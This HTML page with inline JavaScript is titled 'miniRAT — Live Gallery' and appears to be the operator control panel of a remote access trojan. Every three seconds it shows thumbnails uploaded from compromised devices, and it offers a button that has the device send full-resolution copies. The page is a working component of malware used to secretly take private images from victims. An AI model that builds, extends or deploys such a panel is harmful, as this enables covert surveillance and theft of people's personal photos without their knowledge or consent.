<!DOCTYPE html>
<html>
<head>
    <title>miniRAT ‚Äî Live Gallery</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="header">
        <h1>miniRAT <span>Gallery</span></h1>
        <div class="status">
            <div class="live-dot"></div>
            <span>Live ‚Äî refreshing every 3s</span>
        </div>
    </div>
    <div class="stats" id="stats">Loading...</div>
    <div id="gallery" class="gallery"></div>
    <div id="toast" class="toast"></div>

    <script>
        let lastHash = '';

        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 2000);
        }

        async function requestFullRes(filename) {
            try {
                await fetch('/api/request/' + encodeURIComponent(filename), { method: 'POST' });
                showToast('Requested full-res: ' + filename);
                lastHash = '';
                loadThumbnails();
            } catch (e) {
                showToast('Request failed');
            }
        }

        async function loadThumbnails() {
            try {
                const response = await fetch('/api/thumbnails');
                const data = await response.json();
                const gallery = document.getElementById('gallery');
                const stats = document.getElementById('stats');

                if (data.thumbnails && data.thumbnails.length > 0) {
                    const count = data.thumbnails.length;
                    const latest = data.thumbnails[0];
                    const latestTime = latest.uploadedAt
                        ? new Date(latest.uploadedAt).toLocaleString()
                        : 'unknown';
                    const saved = data.thumbnails.filter(t => t.hasFullRes).length;
                    const pending = data.thumbnails.filter(t => t.isPending).length;

                    let statusText = count + ' thumbnails';
                    if (saved > 0) statusText += ' ¬∑ ' + saved + ' full-res saved';
                    if (pending > 0) statusText += ' ¬∑ ' + pending + ' pending';
                    statusText += ' ‚Äî latest: ' + latestTime;
                    stats.textContent = statusText;

                    const newHash = data.thumbnails.map(t =>
                        t.name + t.hasFullRes + t.isPending).join('|');

                    if (newHash !== lastHash) {
                        gallery.innerHTML = '';
                        data.thumbnails.forEach(function(thumb) {
                            const div = document.createElement('div');
                            div.className = 'thumb';

                            let actionBtn = '';
                            if (thumb.hasFullRes) {
                                actionBtn = '<span class="btn btn-saved">‚úì Saved to full_res</span>';
                            } else if (thumb.isPending) {
                                actionBtn = '<span class="btn btn-pending">‚è≥ Waiting for device</span>';
                            } else {
                                actionBtn = '<button class="btn btn-request" onclick="event.stopPropagation();requestFullRes(\'' +
                                    thumb.name.replace(/'/g, "\\'") +
                                    '\')">üì• Get Full Res</button>';
                            }

                            div.innerHTML =
                                '<img src="/uploads/' + thumb.thumbnail + '" alt="' + thumb.name + '">' +
                                '<div class="overlay">' +
                                '<div class="name">' + thumb.name + '</div>' +
                                actionBtn +
                                '</div>';
                            gallery.appendChild(div);
                        });
                        lastHash = newHash;
                    }
                } else {
                    stats.textContent = '0 images ‚Äî waiting for uploads...';
                    gallery.innerHTML =
                        '<div class="empty">' +
                        '<div class="icon">üì°</div>' +
                        'Waiting for incoming thumbnails...' +
                        '</div>';
                }
            } catch (error) {
                document.getElementById('stats').textContent = 'Connection error ‚Äî retrying...';
            }
        }

        loadThumbnails();
        setInterval(loadThumbnails, 3000);
    </script>
</body>
</html>
